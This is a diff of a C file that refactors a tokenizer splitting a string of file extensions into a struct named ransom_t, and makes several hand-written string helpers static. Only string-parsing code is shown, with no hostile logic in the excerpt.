@@ -24,7 +24,7 @@ char *tokenizer(char *str, ransom_t *ransom)
 		if (str[len] == ' ')
 			count_delims++;
 	str_copied = my_calloc((len + 1) * sizeof(char), sizeof(char));
-	ransom->file_ext_nontoken = my_strncat(str_copied, str, 0, len);
+	ransom->file_exts_whole_str = my_strncat(str_copied, str, 0, len);
 	tokens = malloc((count_delims + 2) * sizeof(char *));
 	tokens[0] = token = my_strtok_r(str_copied, "\n ", &saveptr);
 	for (i = 1; token != NULL; i++)
@@ -32,7 +32,6 @@ char *tokenizer(char *str, ransom_t *ransom)
 		token = my_strtok_r(NULL, "\n ", &saveptr);
 		tokens[i] = token;
 	}
-	ransom->num_of_file_ext = i - 1;
 	ransom->file_extensions = tokens;
 	return (tokens[i]);
 }
@@ -98,7 +97,7 @@ char *my_strncat(char *dest, const char *src, size_t offset, size_t n)
  * @c: the char being searched for
  * Return: pointer to char on success, NULL on failure
  */
-char *my_strchr(char *s, char c)
+static char *my_strchr(char *s, char c)
 {
 	int len, i;
 
@@ -117,7 +116,7 @@ char *my_strchr(char *s, char c)
  * @accept: string to match
  * Return: number of matching bytes
  */
-unsigned int my_strspn(char *s, char *accept)
+static unsigned int my_strspn(char *s, char *accept)
 {
 	int s_len, i, result;
 
@@ -138,7 +137,7 @@ unsigned int my_strspn(char *s, char *accept)
  * @delims: bytes to search for in the string.
  * Return: pointer to first occurence in s of anything in accept
  */
-char *my_strpbrk(char *s, char *delims)
+static char *my_strpbrk(char *s, char *delims)
 {
 	char *temp;
 
